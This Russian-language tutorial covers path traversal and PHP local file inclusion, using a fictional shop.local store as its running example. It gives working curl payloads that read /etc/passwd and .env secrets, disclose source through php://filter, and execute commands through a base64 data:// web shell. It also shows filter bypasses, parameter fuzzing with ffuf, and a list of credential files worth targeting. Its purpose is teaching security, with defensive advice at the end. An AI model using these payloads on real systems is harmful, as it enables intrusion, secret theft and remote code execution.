Представь интернет-магазин с личным кабинетом: у каждого заказа есть кнопка «скачать счёт». URL выглядит как `https://shop.local/download?file=invoice-102.pdf`. Сервер берёт имя файла и отдаёт его из папки заказов. Что будет, если вместо имени подставить `../../../../etc/passwd`? Именно этот вопрос — вход в класс **path traversal** и **LFI**.

В этом уроке мы возьмём `shop.local` и проведём **один** разбор: от безобидной ссылки на счёт до чтения чужих файлов и исполнения кода.

## Наш пример: кнопка «скачать счёт»

Откроем ссылку в терминале через `curl` — инструмент, который отправляет HTTP-запрос и печатает ответ:

```bash
$ curl -s -I 'https://shop.local/download?file=invoice-102.pdf'
HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Disposition: attachment; filename=invoice-102.pdf
```

Сервер честно отдаёт PDF. Мы не видим код, но догадываемся: где-то в приложении написано примерно `open("/var/www/shop/invoices/" + file)`. Имя файла приклеивается к папке. Если имя подконтрольно нам — можно выйти за пределы папки через `../` (это значит «подняться на один каталог вверх»).

## Шаг 1: выходим из каталога (path traversal)

Подставим вместо имени цепочку `../` и посмотрим на `/etc/passwd` — файл со списком пользователей, он есть почти на любом Linux:

```bash
$ curl -s 'https://shop.local/download?file=../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Мы получили содержимое системного файла. Значит, `../` работает, а проверки пути нет. Почему столько `../`? Мы не знаем глубину папки `invoices`, поэтому ставим с избытком: лишние «подъёмы» в корне `/` безвредны — выше корня не подняться.

## Шаг 2: зачем это нужно

Чтение `/etc/passwd` само по себе малоинтересно (там нет паролей). Ценность в том, что тот же приём открывает **конфиги и исходники**, где лежат секреты:

```bash
$ curl -s 'https://shop.local/download?file=../../../../var/www/shop/.env'
DB_HOST=db.internal
DB_USER=shop
DB_PASS=Sup3rS3cret!
AWS_KEY=AKIA...
```

Теперь у нас пароль от базы и облачный ключ. Одна «ссылка на счёт» превратилась в кражу секретов.

## Шаг 3: traversal или LFI — в чём разница

Только что мы **читали** файл. Но есть родственный класс, где файл **включается** в код и исполняется. Это **LFI** (Local File Inclusion, «локальное включение файла»). Так бывает в PHP, где страницы собирают через `include`:

```php
<?php
$page = $_GET['page'];      // пришло из URL: ?page=about
include($page . '.php');    // подключаем файл как код
?>
```

Здесь параметр `?page=about` подставляет имя файла, и PHP **исполняет** его содержимое. Отличие от traversal принципиально: traversal отдаёт байты, а LFI может выполнить код → это путь к **RCE** (Remote Code Execution, выполнение своего кода на сервере).

## Шаг 4: читаем исходник, который нельзя «показать»

Если файл включается и исполняется, мы не увидим его текст — увидим результат работы. Например, `?page=config` не покажет `config.php`, а выполнит его. Чтобы всё-таки прочитать код, есть **PHP-обёртка** `php://filter` — специальный префикс, который обрабатывает файл перед выдачей:

```bash
$ curl -s 'https://shop.local/?page=php://filter/convert.base64-encode/resource=config'
<?php
$admin_pass = "..." ;   # (после base64 -d)
```

Обёртка `convert.base64-encode` кодирует содержимое файла в base64, поэтому PHP его не исполняет, а печатает как текст. Так мы «скармливаем» серверу собственный исходник и читаем секреты из кода.

## Шаг 5: от чтения к исполнению

Если приложение включает файл, мы можем попробовать подсунуть **свой** код. Самая простая обёртка — `data://`: она позволяет передать данные прямо в URL.

```bash
$ curl -s 'https://shop.local/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Строка в base64 декодируется в `<?php system($_GET['c']); ?>` — мини-команда, которая выполняет то, что мы передали в `?c=`. Мы получили `uid=33(www-data)`: код исполнился на сервере.

`data://` работает только если в PHP включена опция `allow_url_include`. Если она выключена — есть запасной путь: **filter chain** (цепочка из `php://filter/convert.iconv...`, которая собирает полезную нагрузку из байтов самого файла). Это уже продвинутая тема, и ей посвящён отдельный урок `web-php-wrappers`.

## Шаг 6: обходы фильтров

Разработчики часто пытаются «вычистить» `../` из ввода. Простые фильтры обходятся:

```bash
$ curl -s 'https://shop.local/download?file=....//....//etc/passwd'   # вырезали '../' → склеилось обратно
$ curl -s 'https://shop.local/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd'  # URL-кодирование
$ curl -s 'https://shop.local/download?file=/etc/passwd'              # абсолютный путь
```

Смысл один: фильтр проверяет строку **до** нормализации, а файловая система — **после**. Разница между «что проверили» и «что открыли» и есть уязвимость.

## Шаг 7: если включается только с суффиксом

Иногда код делает `include($page . '.php')` — дописывает `.php`. Тогда `data://...` превратится в `data://...php` и сломается. Обход — добавить `?` в конец полезной нагрузки, чтобы `.php` стало частью query-строки, либо использовать null-байт `%00` (на старых версиях PHP):

```bash
$ curl -s 'https://shop.local/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+?&c=id'
uid=33(www-data) ...
```

## Шаг 8: где вообще искать такие параметры

Мы начали с готовой ссылки `?file=`, но в реальном приложении параметр надо найти. Ищи имена, которые намекают на работу с файлом или страницей: `file`, `page`, `path`, `doc`, `template`, `view`, `lang`, `include`, `mod`, `download`, `read`. Особенно подозрительны места, где URL заканчивается именем файла (`/download?file=...`, `/page?view=...`) или где сервер отдаёт документы по имени.

Хороший приём — не угадывать вручную, а перебрать список имён параметров инструментом `ffuf`, подставляя в значение заведомо существующий файл и ища характерную строку:

```bash
$ ffuf -u 'https://shop.local/?FUZZ=/etc/passwd' -w params.txt -mr 'root:x:0:0'
file                    [Status: 200, Size: 1204]
```

Флаг `-mr` («match regex») оставляет только ответы, в которых есть строка из `/etc/passwd`. Так из сотни имён параметров сразу видно рабочее — `file`.

## Шаг 9: почему «просто чтение» уже опасно

Может показаться, что чтение файлов — не такая серьёзная проблема. Но представь, что в `.env` лежит ключ от облака, а в `/home/deploy/.ssh/id_rsa` — приватный SSH-ключ. Прочитав их, ты можешь войти в инфраструктуру под легальным пользователем. Поэтому path traversal/LFI почти всегда оценивают как high или critical, даже когда «всего лишь читают». А если сервер ещё и исполняет включённый файл (LFI), то чтение превращается в RCE — полный контроль над сервером.

## Что мы теперь знаем

- **Path traversal** — выход из каталога через `../`; читает произвольные файлы.
- **LFI** — включение файла как кода; может исполнять → RCE.
- `php://filter` читает исходники, не исполняя их (в base64).
- `data://`/`php://input` дают RCE, если включён `allow_url_include`.
- Фильтры обходятся `....//`, `%2e%2e%2f`, абсолютными путями.
- Ценность — не `/etc/passwd`, а `.env`, конфиги и исходники с секретами.

## На что смотреть дальше

- **Параметры-кандидаты:** `?file=`, `?page=`, `?lang=`, `?template=`, `?view=`, `?path=`, `?doc=`.
- **Полезные файлы:** `/etc/hostname`, `/proc/self/environ` (переменные окружения, часто секреты), `/home/*/.bash_history`, `/app/.env`.
- **Если логи читаемы** — их можно «отравить» своим кодом и исполнить; об этом следующий урок.

## Куда дальше

Мы научились читать чужие файлы и даже исполнять код через обёртки. Но что, если никакой обёртки нет, а исполнять нужно? Тогда мы «отравим» файл, который сервер точно включает, — например, лог доступа. В следующем уроке разберём **log poisoning** и превратим «просто чтение» в RCE. А пока запомни: **путь собирается из ввода — вот где рождается traversal; нормализуй, ограничивай каталог, не доверяй имени файла.**

## Где пригодится

- **CTF (Web):** LFI — прямой путь к флагу (он лежит в файле); `php://filter` и обёртки — стандартные шаги.
- **Bug bounty:** LFI/path traversal на продакшене = high/critical, особенно если ведёт к чтению конфигов или RCE.
- **Пентест:** чтение `/etc/passwd` и конфигов — типичный этап пост-эксплуатации и латерального движения.
- **Работа (AppSec):** нормализация путей, whitelisting включаемых файлов, отключение `allow_url_include` — базовые меры защиты.
